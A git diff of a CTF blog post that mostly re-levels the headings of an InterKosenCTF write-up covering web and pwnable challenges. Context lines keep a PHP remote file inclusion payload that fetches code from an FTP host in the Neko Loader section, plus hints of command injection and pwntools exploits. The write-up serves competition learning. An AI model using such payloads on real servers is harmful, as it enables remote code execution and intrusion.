@@ -1,13 +1,10 @@
 ---
 layout: post
-title: "Participate to InterKosenCTF"
+title: "InterKosenCTF writeup"
 date: 2019-08-12 15:00
 comments: true
 categories: CTF 
 ---
-
-
-# Result
 
 1st placed at Mashiro(@Emilia)
 
@@ -15,29 +12,29 @@ categories: CTF
 
 writeup is comming soon.
 
-## Writeup
-
-## Crypto
 
 
-
-
-
-## Forensics
+# Crypto
 
 
 
 
 
-## Reversing
+# Forensics
 
 
 
 
 
-## Web
+# Reversing
 
-### uploader
+
+
+
+
+# Web
+
+## uploader
 
 It have file upload and download functions.
 
@@ -67,7 +64,7 @@ Then we got a flag :)
 
 
 
-### Image Extractor
+## Image Extractor
 
 This chall is developed by singtra.
 
@@ -103,7 +100,7 @@ Finally got a flag as access http://URL/flag.png.
 
 
 
-### Neko Loader
+## Neko Loader
 
 This chall is support only download function and source code.
 
@@ -163,7 +160,7 @@ include('ftp://[SERVER]/a.ftp:');
 
 
 
-### E-Sequel-Injection
+## E-Sequel-Injection
 
 Oh it is SQL Injection chall.
 
@@ -173,7 +170,7 @@ Oh it is SQL Injection chall.
 
 
 
-### Image Compressor
+## Image Compressor
 
 In sourecode, we found some code to control `options` at system.
 
@@ -204,9 +201,9 @@ So, we can command injeciton using -T, -TT.
 
 
 
-## Pwnable
+# Pwnable
 
-### Fastbin Tutorial
+## Fastbin Tutorial
 
 It's simple fastbin tutorial problem.
 
@@ -289,7 +286,7 @@ t.interactive()
 
 
 
-### Shopkeeper
+## Shopkeeper
 
 If you buy some item, then each item's event is executed.
 
@@ -414,7 +411,7 @@ t.interactive()
 
 
 
-### Bullsh
+## Bullsh
 
 It's simple shell binary, but it doesn't have lots of command.
 
@@ -496,7 +493,7 @@ t.interactive()
 
 
 
-### Stegorop
+## Stegorop
 
 This is simple ROP Prob.
 
@@ -563,7 +560,7 @@ t.interactive()
 
 
 
-### Kitten
+## Kitten
 
 This chall is OOB read/write and Tcache poisoning
 
